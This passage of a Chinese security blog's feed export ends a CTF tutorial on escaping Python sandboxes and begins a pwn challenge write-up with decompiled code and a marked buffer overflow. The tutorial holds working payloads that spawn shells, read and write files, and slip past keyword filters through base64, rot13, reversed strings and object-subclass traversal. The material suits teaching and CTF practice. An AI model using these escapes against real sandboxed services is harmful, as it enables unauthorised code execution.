os.system(&quot;/bin/sh&quot;)</span><br><span class="line">$ whoami</span><br><span class="line">sirius</span><br></pre></td></tr></table></figure><ol start="2"><li>exec &amp; eval 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)</span><br><span class="line"></span><br><span class="line">exec(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)</span><br></pre></td></tr></table></figure><p>两个执行函数，没什么可说的。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(&apos;__import__(&quot;os&quot;).system(&quot;/bin/sh&quot;)&apos;)</span><br><span class="line">$ whoami</span><br><span class="line">sirius</span><br></pre></td></tr></table></figure></p><ol start="3"><li>execfile 函数</li></ol><p>执行文件，主要用于引入模块来执行命令<br>python3不存在</p><ol start="4"><li>timeit 函数 from timeit 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;,number=1)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import timeit</span><br><span class="line">&gt;&gt;&gt; timeit.timeit(&apos;__import__(&quot;os&quot;).system(&quot;sh&quot;)&apos;,number=1)</span><br><span class="line">$ whoami</span><br><span class="line">sirius</span><br></pre></td></tr></table></figure><ol start="5"><li>platform 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import platform </span><br><span class="line">print platform.popen(&apos;dir&apos;).read()</span><br></pre></td></tr></table></figure><p>platform提供了很多方法去获取操作系统的信息，popen函数可以执行任意命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import platform </span><br><span class="line">&gt;&gt;&gt; print platform.popen(&apos;dir&apos;).read()</span><br><span class="line">jail.py</span><br></pre></td></tr></table></figure><ol start="7"><li>commands 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import commands</span><br><span class="line">print commands.getoutput(&quot;dir&quot;)</span><br><span class="line">print commands.getstatusoutput(&quot;dir&quot;)</span><br></pre></td></tr></table></figure><p>依旧可以用来执行部分指令，貌似不可以拿shell，但其他的很多都可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import commands</span><br><span class="line">&gt;&gt;&gt; print commands.getoutput(&quot;dir&quot;)</span><br><span class="line">flag  jail.py</span><br><span class="line">&gt;&gt;&gt; print commands.getstatusoutput(&quot;dir&quot;)</span><br><span class="line">(0, &apos;flag  jail.py&apos;)</span><br></pre></td></tr></table></figure><ol start="8"><li>subprocess模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">subprocess.call([&apos;ls&apos;],shell=True)</span><br></pre></td></tr></table></figure><p>shell=True 命令本身被bash启动，支持shell启动，否则不支持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import subprocess</span><br><span class="line">&gt;&gt;&gt; subprocess.call([&apos;ls&apos;],shell=True)</span><br><span class="line">flag  jail.py</span><br></pre></td></tr></table></figure><ol start="9"><li>compile 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>菜鸟：<a href="http://www.runoob.com/python/python-func-compile.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-compile.html</a></p><ol start="10"><li>f修饰符</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f&apos;&#123;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#125;&apos;</span><br></pre></td></tr></table></figure><p>python 3.6加上的新特性，用f,F修饰的字符串可以执行代码。</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ol><li>file 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(&apos;flag.txt&apos;).read()</span><br></pre></td></tr></table></figure><ol start="2"><li>open 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&apos;flag.txt&apos;).read()</span><br></pre></td></tr></table></figure><ol start="3"><li><p>codecs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import codecs</span><br><span class="line">codecs.open(&apos;test.txt&apos;).read()</span><br></pre></td></tr></table></figure></li><li><p>Filetype 函数 from types 模块</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import types</span><br><span class="line">print types.FileType(&quot;flag&quot;).read()</span><br></pre></td></tr></table></figure><p>可以用来读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import types</span><br><span class="line">&gt;&gt;&gt; print types.FileType(&quot;flag&quot;).read()</span><br><span class="line">flag_here</span><br></pre></td></tr></table></figure></p><p>关于python内部查看版本号，可以使用sys模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; print sys.version</span><br><span class="line">2.7.12 (default, Nov 12 2018, 14:36:49) </span><br><span class="line">[GCC 5.4.0 20160609]</span><br></pre></td></tr></table></figure><h2 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h2><h3 id="import-os-引入"><a href="#import-os-引入" class="headerlink" title="import / os 引入"></a>import / os 引入</h3><p>使用内联函数：</p><ol><li><strong>import</strong>函数</li></ol><p><strong>import</strong>函数本身是用来动态的导入模块，比如：<strong>import</strong>(module) == import module</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = __import__(&quot;bf&quot;.decode(&apos;rot_13&apos;))       //os </span><br><span class="line">a.system(&apos;sh&apos;)</span><br></pre></td></tr></table></figure><p>importlib库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line">a = importlib.import_module(&quot;bf&quot;.decode(&apos;rot_13&apos;))    //os</span><br><span class="line">a.system(&apos;sh&apos;)</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>builtins</strong>函数</li></ol><p>使用 python 内置函数 <strong>builtins</strong> (该函数模块中的函数都被自动引入，不需要再单独引入) , dir(<strong>builtins</strong>) 查看剩余可用内置函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir(__builtins__)</span><br><span class="line">[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</span><br></pre></td></tr></table></figure><p>这里是在没有禁用函数时的情况， 可以看到里面有一些一般不会禁用的函数比如说对文件的操作函数 open，int，chr等，还有dict函数</p><p>一个模块对象有一个由字典对象实现的命名空间…属性引用被转换为这个字典中的查找，例如，m.x等同于m.dict[“x”],我们就可以用一些编码来绕过字符明文检测。</p><p>所以可以有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;)).system(&apos;sh&apos;)   == __builtins__.__dict__[_import__](&apos;os&apos;).system(&apos;sh&apos;)</span><br></pre></td></tr></table></figure></p><ol start="3"><li>路径引入os等模块</li></ol><p>因为一般都是禁止引入敏感包，当禁用os时，实际上就是  sys.modules[‘os’]=None</p><p>而因为一般的类unix系统的python os路径都是/usr/lib/python2.7/os.py  ,所以可以通过路径引入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.modules[&apos;os&apos;]=&apos;/usr/lib/python2.7/os.py&apos;</span><br></pre></td></tr></table></figure><ol start="4"><li>reload</li></ol><p>禁止引用某些函数时，可能会删除掉一些函数的引用,比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del __builtins__.__dict__[&apos;__import__&apos;]</span><br></pre></td></tr></table></figure></p><p>这样就无法再引入，但是我们可以用 reload(<strong>builtins</strong>) 重载<strong>builtins</strong>模块恢复内置函数</p><p>但是reload本身也是<strong>builtins</strong>模块的函数，其本身也可能会被禁掉</p><p>在可以引用包的情况下，我们还可以使用imp模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import __builtins__</span><br><span class="line">import imp</span><br><span class="line">imp.reload(__builtin__)</span><br></pre></td></tr></table></figure><p>这样就可以得到完整的<strong>builtins</strong>模块了，需要注意的是需要先import <strong>builtins</strong> ,如果不写的话，虽然<strong>builtins</strong>模块已经被引入，但是它实际上是不可见的，即它仍然无法被找到,这里是这么说的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">引入imp模块的reload函数能够生效的前提是，在最开始有这样的程序语句import __builtins__，这个import的意义并不是把内建模块加载到内存中，因为内建早已经被加载了，它仅仅是让内建模块名在该作用域中可见。</span><br></pre></td></tr></table></figure><p>再如果imp的reload被禁用掉呢？同时禁用掉路径引入需要的sys模块呢？<br>可以尝试上面的execfile()函数,或者open函数打开文件，exec执行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execfile(&apos;/usr/lib/python2.7/os.py&apos;)</span><br></pre></td></tr></table></figure><ol start="5"><li>函数名字符串扫描过滤的绕过</li></ol><p>假如沙箱本身不是通过对包的限制，而是扫描函数字符串，关键码等等来过滤的；而关键字和函数没有办法直接用字符串相关的编码或解密操作</p><p>这里就可以使用： getattr &amp;&amp; <strong>getattribute</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getattr(__import__(&quot;os&quot;),&quot;flfgrz&quot;.encode(&quot;rot13&quot;))(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">getattr(__import__(&quot;os&quot;),&quot;metsys&quot;[::-1])(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">__import__(&quot;os&quot;).__getattribute__(&quot;metsys&quot;[::-1])(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">__import__(&quot;os&quot;).__getattribute__(&quot;flfgrz&quot;.encode(&quot;rot13&quot;))(&apos;ls&apos;)</span><br></pre></td></tr></table></figure><p>runoob ：<a href="http://www.runoob.com/python/python-func-getattr.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-getattr.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果某个类定义了 getattr() 方法，Python 将只在正常的位置查询属性时才会调用它。如果实例 x 定义了属性 color， x.color 将 不会 调用x.getattr(‘color’)；而只会返回 x.color 已定义好的值。</span><br><span class="line">如果某个类定义了 __getattribute__() 方法，在 每次引用属性或方法名称时 Python 都调用它（特殊方法名称除外，因为那样将会导致讨厌的无限循环）。</span><br></pre></td></tr></table></figure></p><h3 id="object-命令引入执行"><a href="#object-命令引入执行" class="headerlink" title="object 命令引入执行"></a>object 命令引入执行</h3><p>object 类中集成了很多基础函数，我们也可以用object来进行调用的操作</p><p>对于字符串对象：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__</span><br><span class="line">(&lt;type &apos;object&apos;&gt;,)</span><br></pre></td></tr></table></figure></p><p>通过<strong>base</strong>方法可以获取上一层继承关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__</span><br><span class="line">(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</span><br></pre></td></tr></table></figure><p>通过<strong>mro</strong>方法获取继承关系</p><p>所以最常见的创建object对象的方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0]</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2]</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>在获取之后，返回的是一个元组，通过下标+<strong>subclasses</strong>的方法可以获取所有子类的列表。而<strong>subclasses</strong>()第40个是file类型的object。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>所以可以读文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](&quot;jail.py&quot;).read()</span><br><span class="line">&quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;jail.py&quot;).read()</span><br></pre></td></tr></table></figure></p><p>同时写文件或执行任意命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](&quot;jail.py&quot;,&quot;w&quot;).write(&quot;1111&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;jail.py&quot;).read()&apos; )</span><br></pre></td></tr></table></figure></p><p>可以执行命令寻找subclasses下引入过os模块的模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[76].__init__.__globals__[&apos;os&apos;]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&apos;os&apos;]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>参考：<br><a href="http://shaobaobaoer.cn/archives/656/python-sandbox-escape" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/656/python-sandbox-escape</a><br><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F" target="_blank" rel="noopener">https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F</a><br><a href="http://yulige.top/?p=502" target="_blank" rel="noopener">http://yulige.top/?p=502</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;python-沙盒&quot;&gt;&lt;a href=&quot;#python-沙盒&quot; class=&quot;headerlink&quot; title=&quot;python 沙盒&quot;&gt;&lt;/a&gt;python 沙盒&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="python" scheme="http://siriuswhiter.tk/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-pwn prac</title>
    <link href="http://siriuswhiter.tk/2019/04/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-prac/"/>
    <id>http://siriuswhiter.tk/2019/04/06/攻防世界-pwn-prac/</id>
    <published>2019-04-06T06:32:55.000Z</published>
    <updated>2019-04-22T12:03:12.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="100levels"><a href="#100levels" class="headerlink" title="100levels"></a>100levels</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>检查<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><p>两个功能： go hint</p><p>go:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall go(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // ST0C_4</span><br><span class="line">  __int64 v4; // [rsp+0h] [rbp-120h]</span><br><span class="line">  __int64 num2; // [rsp+0h] [rbp-120h]</span><br><span class="line">  int v6; // [rsp+8h] [rbp-118h]</span><br><span class="line">  __int64 num1; // [rsp+10h] [rbp-110h]</span><br><span class="line">  signed __int64 num1a; // [rsp+10h] [rbp-110h]</span><br><span class="line">  signed __int64 cnt; // [rsp+18h] [rbp-108h]</span><br><span class="line">  __int64 v10; // [rsp+20h] [rbp-100h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;How many levels?&quot;);</span><br><span class="line">  v4 = get_num();</span><br><span class="line">  if ( v4 &gt; 0 )</span><br><span class="line">    num1 = v4;</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Coward&quot;);</span><br><span class="line">  puts(&quot;Any more?&quot;);</span><br><span class="line">  num2 = get_num();</span><br><span class="line">  num1a = num1 + num2;</span><br><span class="line">  if ( num1a &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( num1a &lt;= 99 )</span><br><span class="line">    &#123;</span><br><span class="line">      cnt = num1a;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You are being a real man.&quot;);</span><br><span class="line">      cnt = 100LL;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Let&apos;s go!&apos;&quot;);</span><br><span class="line">    v6 = time(0LL);</span><br><span class="line">    if ( (unsigned int)check(cnt) != 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(0LL);</span><br><span class="line">      sprintf((char *)&amp;v10, &quot;Great job! You finished %d levels in %d seconds\n&quot;, cnt, (unsigned int)(v3 - v6), num2);</span><br><span class="line">      puts((const char *)&amp;v10);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You failed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;Coward Coward Coward Coward Coward&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>go调用的check<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall check(signed int cnt)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // eax</span><br><span class="line">  __int64 v3; // rax</span><br><span class="line">  __int64 buf; // [rsp+10h] [rbp-30h]</span><br><span class="line">  __int64 v5; // [rsp+18h] [rbp-28h]</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-20h]</span><br><span class="line">  __int64 v7; // [rsp+28h] [rbp-18h]</span><br><span class="line">  unsigned int v8; // [rsp+34h] [rbp-Ch]</span><br><span class="line">  unsigned int num2; // [rsp+38h] [rbp-8h]</span><br><span class="line">  unsigned int num1; // [rsp+3Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  buf = 0LL;</span><br><span class="line">  v5 = 0LL;</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  v7 = 0LL;</span><br><span class="line">  if ( !cnt )</span><br><span class="line">    return 1LL;</span><br><span class="line">  if ( (unsigned int)check(cnt - 1) == 0 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  num1 = rand() % cnt;</span><br><span class="line">  v2 = rand();</span><br><span class="line">  num2 = v2 % cnt;</span><br><span class="line">  v8 = v2 % cnt * num1;</span><br><span class="line">  puts(&quot;====================================================&quot;);</span><br><span class="line">  printf(&quot;Level %d\n&quot;, (unsigned int)cnt);</span><br><span class="line">  printf(&quot;Question: %d * %d = ? Answer:&quot;, num1, num2);</span><br><span class="line">  read(0, &amp;buf, 0x400uLL);                      // overflow</span><br><span class="line">  v3 = strtol((const char *)&amp;buf, 0LL, 10);</span><br><span class="line">  return v3 == v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>hint<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int hint()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v1; // [rsp+8h] [rbp-108h]</span><br><span class="line">  int v2; // [rsp+10h] [rbp-100h]</span><br><span class="line">  __int16 v3; // [rsp+14h] [rbp-FCh]</span><br><span class="line"></span><br><span class="line">  if ( 